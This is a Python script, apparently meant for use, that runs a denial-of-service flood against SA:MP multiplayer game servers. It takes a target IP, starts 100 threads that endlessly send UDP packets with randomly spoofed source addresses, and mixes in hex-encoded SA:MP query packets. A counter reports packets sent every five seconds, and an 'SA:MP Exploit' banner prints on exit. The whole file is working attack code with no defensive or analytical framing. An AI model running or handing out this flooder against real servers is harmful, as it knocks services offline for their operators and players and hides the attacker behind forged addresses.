from scapy.all import *
from scapy.layers.inet import IP, UDP
import socket
import struct
import codecs
import threading
import random
import time
import os

# List of packets for DoS attack
packets = [
    codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),  # p
    codecs.decode("53414d509538e1a9611e63", "hex_codec"),  # c
    codecs.decode("53414d509538e1a9611e69", "hex_codec"),  # i
    codecs.decode("53414d509538e1a9611e72", "hex_codec"),  # r
    codecs.decode("081e62da", "hex_codec"),  # cookie port 7796
    codecs.decode("081e77da", "hex_codec"),  # cookie port 7777
    codecs.decode("081e4dda", "hex_codec"),  # cookie port 7771
    codecs.decode("021efd40", "hex_codec"),  # cookie port 7784
    codecs.decode("021efd40", "hex_codec"),  # cookie port 1111
    codecs.decode("081e7eda", "hex_codec")  # cookie port 1111 tambem
]

# Taking user input for IP
target_IP = input("Enter target IP: ")
attack_port = 7777  # Default attack port, you can change this if needed
original_IP = target_IP

print("Attack started on IP: %s and Port: %s" % (original_IP, attack_port))

sent_packets = 0  # Counter for sent packets


class MyThread(threading.Thread):
    def run(self):
        global sent_packets
        while True:
            # Generate random spoofed source IP address
            spoofed_source_IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

            # Send spoofed packet using Scapy
            spoofed_packet = IP(src=spoofed_source_IP, dst=target_IP) / UDP(dport=attack_port)
            send(spoofed_packet, verbose=False)  # Set verbose to False to suppress Scapy output

            # Send DoS attack packets
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Internet and UDP
            msg = packets[random.randrange(0, len(packets))]
            sock.sendto(msg, (target_IP, attack_port))

            sent_packets += 1  # Increment the packet counter


def measure_bandwidth():
    global sent_packets
    while True:
        time.sleep(5)  # Adjust the time interval for measurement
        print("Bandwidth sent: {} packets per 5 seconds".format(sent_packets))
        sent_packets = 0  # Reset packet counter for the next measurement


if __name__ == '__main__':
    try:
        # Start the attack thread
        for x in range(100):
            mythread = MyThread()
            mythread.start()

        # Start the bandwidth measurement thread
        bandwidth_thread = threading.Thread(target=measure_bandwidth)
        bandwidth_thread.start()

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print('#########################################################################')
        print('SA:MP Exploit')
        print('#########################################################################')
        print('\n\n')
        print('Attack on {} has been stopped'.format(original_IP))
